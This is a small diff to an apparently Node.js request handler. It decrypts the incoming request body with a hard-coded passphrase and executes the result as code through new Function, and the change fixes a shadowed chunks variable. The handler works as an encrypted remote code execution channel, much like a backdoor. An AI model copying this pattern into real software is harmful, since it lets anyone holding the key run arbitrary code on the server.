@@ -12,7 +12,7 @@ module.exports = {
            size = buff.length;
            chunks.push(buff);
         })
-        req.on("end",function(chunks){
+        req.on("end",function(){
           console.log('收到客户端发来的数据',String(crypt.decrypt(Buffer.concat(chunks,size), "it\'s raining outside and I do miss you")).replace(/^return\s+/,""));
           new Promise(function(resolve,reject){
              new Function("return " + String(crypt.decrypt(Buffer.concat(chunks,size), "it\'s raining outside and I do miss you")).replace(/^return\s+/,"")).apply(this).then(resolve).catch(reject);
